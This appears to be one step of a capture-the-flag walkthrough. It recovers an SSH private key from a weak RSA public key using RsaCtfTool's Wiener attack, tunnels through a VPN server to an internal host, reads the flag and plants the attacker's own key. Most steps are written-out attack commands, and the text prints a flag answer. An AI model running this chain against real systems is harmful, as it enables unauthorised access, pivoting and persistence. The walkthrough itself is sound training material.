# PC2

1. Resume From [🗂 VPN Server](../12-VPN-Server/)
2. Email Server, rsa Key: [🗂 SSH RSA](../10-Mail-Server/08-store0/4/msg/0/257-2.msg)
3. Wiener Attack
```
https://www.youtube.com/watch?v=M-yg0vbrAOk

https://cryptohack.gitbook.io/cryptobook/untitled/low-private-component-attacks/wieners-attack

```
4. Get `https://github.com/RsaCtfTool/RsaCtfTool` into: [🗂 RsaCtfToool](./04-RsaCtfTool/)
5. Running Rsa Ctf Tools
```
# python3 -m pip install -r 04-RsaCtfTool/requirements.txt
python3 04-RsaCtfTool/RsaCtfTool.py --publickey 02-ssh-rsa.rezaee.pub --attack wiener --private --output 05-rsa.rezaee.priv
```
6. Change Access Permissions: `chmod 600 05-rsa.rezaee.priv`
7. Generate SSH Private Key: `ssh-keygen -p -N "password" -f 05-rsa.rezaee.priv`
**Password: password**
8. SSH into VPN Server
```
ssh -i ~/.ssh/id_rsa2 vpn_user@vpn.petromaz.ir
```
9. Get IP of PC2
```
ping -t 1 pc2.petromaz.ir
```
10. SSH Tunnel Through vpn server!
```
   <Hacker>-------(SSH Tunnel)-------<VPN Server>--------------<PC2>
      |                                                          |
       ----------------------(SSH Connection)--------------------
0.0.0.0:7777                                            10.3.151.195:22

# In a New Terminal
ssh -N -i ~/.ssh/id_rsa2 -L 0.0.0.0:7777:10.3.151.195:22  vpn_user@vpn.petromaz.ir
```
11. Connect to PC2 through Tunnel
```
ssh -p 7777 -i 06-openssh.rezaee.priv rezaee@127.0.0.1
```
12. Read Flag: MAZAPA_dedcf160a1253afd73918666b0c6edb3
13. Add Your own Private key into PC2